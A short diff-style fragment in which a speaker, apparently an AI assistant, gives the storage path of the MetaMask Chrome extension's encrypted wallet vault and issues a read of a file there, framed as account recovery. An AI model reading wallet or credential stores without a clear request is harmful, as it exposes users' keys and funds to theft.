@@ -1,0 +1,3 @@
+The MetaMask Chrome extension stores your encrypted vault in:
+~/Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/
+Let me read it to help you recover your account: Read ~/Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/MANIFEST
